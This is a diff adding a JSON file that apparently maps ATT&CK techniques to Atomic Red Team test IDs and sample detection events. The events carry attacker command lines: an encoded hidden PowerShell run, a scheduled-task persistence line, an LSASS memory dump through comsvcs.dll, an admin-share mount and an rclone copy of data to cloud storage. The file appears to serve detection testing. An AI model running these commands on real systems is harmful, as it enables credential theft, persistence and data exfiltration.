@@ -1,0 +1,75 @@
+{
+  "T1566.001": {
+    "name": "Spearphishing Attachment",
+    "tactic": "initial-access",
+    "atomic_test_guids": ["af8f18d1-1dc9-4b0a-8bcd-7b3d9e9d7d3c"],
+    "event": {
+      "event_type": "email_attachment_opened",
+      "process_name": "OUTLOOK.EXE",
+      "child_process": "WINWORD.EXE"
+    }
+  },
+  "T1059.001": {
+    "name": "PowerShell",
+    "tactic": "execution",
+    "atomic_test_guids": ["9ddcbaef-9a3c-4834-9f68-d5e21bb4e630"],
+    "event": {
+      "event_type": "process_creation",
+      "process_name": "powershell.exe",
+      "command_line": "powershell.exe -nop -w hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA=="
+    }
+  },
+  "T1053.005": {
+    "name": "Scheduled Task",
+    "tactic": "persistence",
+    "atomic_test_guids": ["7b52dd6e-6c47-4055-b58b-6aef16bb90c7"],
+    "event": {
+      "event_type": "process_creation",
+      "process_name": "schtasks.exe",
+      "command_line": "schtasks /create /sc minute /mo 5 /tn Updater /tr C:\\Users\\Public\\upd.exe"
+    }
+  },
+  "T1003.001": {
+    "name": "LSASS Memory",
+    "tactic": "credential-access",
+    "atomic_test_guids": ["b6a02069-fc73-4a29-ba71-98c6b06bb1b9"],
+    "event": {
+      "event_type": "process_access",
+      "process_name": "rundll32.exe",
+      "target_process": "lsass.exe",
+      "command_line": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 596 C:\\Windows\\Temp\\lsass.dmp full"
+    }
+  },
+  "T1021.002": {
+    "name": "SMB/Windows Admin Shares",
+    "tactic": "lateral-movement",
+    "atomic_test_guids": ["8a3c4074-b3cf-4a1b-8f2d-1afea50ea99f"],
+    "event": {
+      "event_type": "network_connection",
+      "process_name": "net.exe",
+      "command_line": "net use \\\\10.0.0.15\\C$ /user:admin",
+      "dest_port": 445
+    }
+  },
+  "T1567.002": {
+    "name": "Exfiltration to Cloud Storage",
+    "tactic": "exfiltration",
+    "atomic_test_guids": ["e2f5d456-2b1e-4a24-8c0a-2e7f0f4e6e2a"],
+    "event": {
+      "event_type": "network_connection",
+      "process_name": "rclone.exe",
+      "command_line": "rclone.exe copy C:\\Data remote:backup",
+      "dest_domain": "storage.googleapis.com"
+    }
+  },
+  "T1486": {
+    "name": "Data Encrypted for Impact",
+    "tactic": "impact",
+    "atomic_test_guids": ["3c5b1e9a-2f4b-4c1d-9d6e-1a2b3c4d5e6f"],
+    "event": {
+      "event_type": "file_modification",
+      "process_name": "encryptor.exe",
+      "file_extension_added": ".locked"
+    }
+  }
+}
